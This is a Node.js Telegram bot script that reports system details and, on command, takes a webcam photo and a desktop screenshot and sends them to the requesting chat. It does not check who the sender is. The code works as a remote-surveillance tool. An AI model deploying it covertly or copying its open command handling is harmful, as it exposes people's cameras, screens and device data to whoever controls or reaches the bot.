const si = require("systeminformation");
const sys = require("./system.json");
const TelegramBot = require("node-telegram-bot-api");
const NodeWebcam = require("node-webcam");
const fs = require("node:fs")
const screenshot = require('screenshot-desktop')
require("dotenv").config()


// Definisikan opsi webcam
const opts = {
    width: 1280,
    height: 720,
    quality: 100,
    delay: 0,
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location",
    verbose: false,
};

// Inisialisasi webcam
const Webcam = NodeWebcam.create(opts);

async function getDeviceInfo() {
    const [
        cpu,
        cpuSpeed,
        cpuLoad,
        ram,
        graphics,
        storage,
        time,
        network,
        battery,
        system,
        ops,
    ] = await Promise.all([
        si.cpu(),
        si.cpuCurrentSpeed(),
        si.currentLoad(),
        si.mem(),
        si.graphics(),
        si.fsSize(),
        si.time(),
        si.networkInterfaces(),
        si.battery(),
        si.system(),
        si.osInfo(),
    ]);

    // Informasi Uptime
    const uptime = time.uptime;
    const days = Math.floor(uptime / (24 * 3600));
    const hours = Math.floor((uptime % (24 * 3600)) / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    const deviceInfo = `${system.manufacturer} ${system.model} - ${ops.distro} ${ops.arch} (${ops.release})`;

    // Informasi CPU
    const cpuInfo = `Processor: ${cpu.manufacturer} ${
        cpu.brand
    } (${cpuLoad.currentLoad.toFixed(2)} %)
Clock Speeds:
${cpuSpeed.cores
    .map((speed, index) => `Core ${index + 1}: ${speed} GHz`)
    .join("\n")}
  `;

    // Informasi RAM
    const ramInfo = `RAM Total: ${(ram.total / 1024 / 1024 / 1024).toFixed(
        2
    )} GB
RAM Used: ${(ram.active / 1024 / 1024 / 1024).toFixed(2)} GB`;

    // Informasi GPU
    const gpuInfo = graphics.controllers
        .map(
            (gpu) =>
                `Graphic Card: ${gpu.vendor} ${gpu.model}
  GPU Memory Used: ${gpu.memoryUsed ? gpu.memoryUsed : 0} MB
  GPU Memory Total: ${gpu.memoryTotal ? gpu.memoryTotal : 0} MB
  GPU Utilization: ${gpu.utilizationGpu ? gpu.utilizationGpu : 0}%`
        )
        .join("\n");

    // Informasi Storage
    const storageInfo = storage
        .map(
            (disk) =>
                `Storage Device: ${disk.fs}
  Total Size: ${(disk.size / 1024 / 1024 / 1024).toFixed(2)} GB
  Used: ${(disk.used / 1024 / 1024 / 1024).toFixed(2)} GB
  Available: ${((disk.size - disk.used) / 1024 / 1024 / 1024).toFixed(2)} GB`
        )
        .join("\n");

    // Informasi Uptime
    const uptimeInfo = `Device Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s`;

    // Informasi Network (koneksi dan kecepatan)
    const activeNetwork = network.filter((net) => net.operstate === "up");
    const networkInfo = activeNetwork.length
        ? activeNetwork
              .map(
                  (net, index) => `${net.iface} (${net.type})
  IP Address: ${net.ip4}`
              )
              .join("\n")
        : "No active network connection";

    // Informasi Baterai (jika tersedia)
    const batteryInfo = battery
        ? `Battery Info:
  Battery Percentage: ${battery.percent}%
  Charging: ${battery.isCharging ? "Yes" : "No"}`
        : "No battery detected";

    // Menyusun semua informasi menjadi satu string
    const deviceDetails = `
${system.deviceName ? `${system.deviceName}\n${deviceInfo}` : `${deviceInfo}`}

✦ Device Information ✦
${cpuInfo}

✦ Memory Information ✦
${ramInfo}

✦ GPU Information ✦
${gpuInfo}

✦ Storage Information ✦
${storageInfo}

✦ Uptime Information ✦
${uptimeInfo}

✦ Network Information ✦
${networkInfo}

✦ Battery Information ✦
${batteryInfo}
`;

    return deviceDetails;
}

// replace the value below with the Telegram token you receive from @BotFather
const token = process.env.token;

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, { polling: true });

bot.on("message", async (msg) => {
    const chatId = msg.chat.id;

    console.log(msg.text);

    if (msg.text === sys.deviceName + " - detail") {
        getDeviceInfo().then((res) => {
            bot.sendMessage(chatId, res);
            console.log(res);
        });
    }

    if (msg.text === sys.deviceName + " - kamera") {
        // Ambil gambar
        await Webcam.capture("kamera", async function (err, data) {
            if (err) {
                bot.sendMessage(chatId, "Gagal mengambil gambar: " + err);
            } else {
                await bot.sendPhoto(chatId, fs.readFileSync(data))
            }
        });
    }

    if(msg.text === sys.deviceName + " - screenshot" || msg.text === sys.deviceName + " - ss") {
        await screenshot({ format: 'png'}).then(async (img) => {
            await require("fs").writeFileSync('screenshot.png', img)
            await bot.sendPhoto(chatId, fs.readFileSync('./screenshot.png'))
        }).catch((err) => {
            console.error("Gagal mengambil screenshot: ", err)
            bot.sendMessage(chatId, "Gagal mengambil screenshot: " + err);
        })
    }
});
